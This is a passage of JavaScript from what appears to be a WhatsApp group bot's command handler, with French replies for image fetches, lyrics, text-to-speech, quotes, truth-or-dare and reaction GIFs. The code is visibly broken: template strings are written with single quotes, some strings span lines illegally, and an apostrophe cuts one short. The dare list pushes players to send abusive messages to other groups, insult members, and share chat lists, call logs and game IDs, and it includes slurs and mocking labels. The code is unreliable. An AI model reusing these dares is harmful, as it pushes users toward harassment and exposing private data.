if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\n_*Voici le resultat de ${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: yeha}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'lyrics': {
if (!text) return replygckev('Quel lyrics cherchez-vous ?\nExemple usage: ${prefix}lyrics Believer')
await KevStickWait()
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
const kevlirik = '
*Titre :* ${result.title}
*Auteur :* ${result.author}
*Url :* ${result.link}

*Lyrics :* ${result.lyrics}

'.trim()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kevlirik
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"✨\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'pick': {
            	if (!m.isGroup) return KevStickGroup()
            	if (!text) return replygckev('What do you want to pick?\nExemple: ${prefix + command} beau')
             const groupMetadata = m.isGroup ? await Kev.groupMetadata(m.chat)
                 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let kevshimts = member[Math.floor(Math.random() * member.length)]
             let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Le plus *${text}* ici est *@${kevshimts.split("@")[0]}*'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"😂\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [kevshimts], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
             
         }
     break
     case 'dis': case 'tts': case 'redis':{
if (!text) return replygckev('Veuillez entrer un texte')
            let texttts = text
            const kevrl = googleTTS.getAudioUrl(texttts, {
                lang: "fr",
                slow: false,
                host: "https://translate.google.com",
            })
            return Kev.sendMessage(m.chat, {
                audio: {
                    url: kevrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: '${text}.mp3'
            }, {
                quoted: m,
            })
        }
        break
    case 'quotes':{
const quotekevinou = await axios.get('https://favqs.com/api/qotd')
        const textquotes = '*${themeemoji} Quote:* ${quotekevinou.data.quote.body}\n\n*${themeemoji} Auteur:* ${quotekevinou.data.quote.author}'
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: textquotes
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'truth': case 'dare': {
	bufferdare = await getBuffer('https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg')
	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nPlease Choose The Button Below'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Truth 🌝\",\"id\":\"${prefix}turut"}'
            },
{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Dare 🌚\",\"id\":\"${prefix}dere"}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'dere':{
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner xeon through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love youðŸ˜Œ",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const kevdare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer('https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg')
              let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '_You choose DARE_\n'+ kevdare
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"PLAY AGAIN 🤔\",\"id\":\"${prefix}dare"}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
              break
                            break
       case 'turut':{
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, xeon?ðŸ¤£",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const kevtruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer('https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg')
              let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '_You choose TRUTH_\n'+ kevtruth
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"PLAY AGAIN 🤔\",\"id\":\"${prefix}truth"}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
              break
              case 'hug': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev('tag une personne')
        var pat = await fetchJson('https://api.waifu.pics/sfw/hug')

        try {

          let messsender = m.sender

          let musers = ''
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = '@${m.sender.split("@")[0]} hugged themself!'

          } else {

           musers = '@${m.sender.split("@")[0]} hugged @${users.split("@")[0]} '

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'pleure': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev('Tag une personne')
        var pat = await fetchJson('https://api.waifu.pics/sfw/cry')

        try {

          let messsender = m.sender

          let musers = ''
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = '@${m.sender.split("@")[0]} cried themself!'

          } else {

           musers = '@${m.sender.split("@")[0]} cried @${users.split("@")[0]} '

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'tuer': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev('Tag une personne')
        var pat = await fetchJson('https://api.waifu.pics/sfw/kill')

        try {

          let messsender = m.sender

          let musers = ''
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = '@${m.sender.split("@")[0]} killed themself!'

          } else {

           musers = '@${m.sender.split("@")[0]} killed @${users.split("@")[0]} '

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'pat': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev('Tag une personne')
        var pat = await fetchJson('https://api.waifu.pics/sfw/pat')

        try {

          let messsender = m.sender

          let musers = ''
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = '@${m.sender.split("@")[0]} patted themself!'

          } else {

           musers = '@${m.sender.split("@")[0]} patted @${users.split("@")[0]} '

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'lick': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev('Tag une personne')
        var pat = await fetchJson('https://api.waifu.pics/sfw/lick')

        try {

          let messsender = m.sender

          let musers = ''
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = '@${m.sender.split("@")[0]} licked themself!'

          } else {

           musers = '@${m.sender.split("@")[0]} licked @${users.split("@")[0]} '

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bisous': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev('Tag une personne')
        var pat = await fetchJson('https://api.waifu.pics/sfw/kiss')

        try {

          let messsender = m.sender

          let musers = ''
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = '@${m.sender.split("@")[0]} kissed themself!'

          } else {

           musers = '@${m.sender.split("@")[0]} kissed @${users.split("@")[0]} '

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bite': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev('Tag une personne')
        var pat = await fetchJson('https://api.waifu.pics/sfw/cry')

        try {

          let messsender = m.sender

          let musers = ''
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = '@${m.sender.split("@")[0]} bit themself!'

          } else {

           musers = '@${m.sender.split("@")[0]} bit @${users.split("@")[0]} '

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'yeet': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev('Tag une personne')
        var pat = await fetchJson('https://api.waifu.pics/sfw/yeet')

        try {

          let messsender = m.sender

          let musers = ''
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = '@${m.sender.split("@")[0]} yeeted themself!'

          } else {

           musers = '@${m.sender.split("@")[0]} yeeted @${users.split("@")[0]} '

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
case 'anime': {
if (!text) return replygckev('Veuillez entrer le nom de l'anime')
const malScraper = require('mal-scraper')
await KevStickWait()
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return replygckev('introuvable')
let animetxt = '
🎀 *Titre: ${anime.title}*
